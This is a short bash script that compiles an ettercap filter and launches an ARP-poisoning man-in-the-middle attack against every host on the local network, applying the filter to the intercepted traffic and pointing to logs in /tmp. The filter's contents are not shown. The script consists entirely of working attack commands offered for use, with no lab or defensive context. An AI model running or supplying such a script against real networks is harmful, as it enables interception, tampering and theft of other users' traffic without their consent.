#!/bin/bash
sudo etterfilter ip.filter -o ip.ef
sudo ettercap -Tq -F ip.ef -M arp:remote // //
echo "Log files are located in /tmp directory"
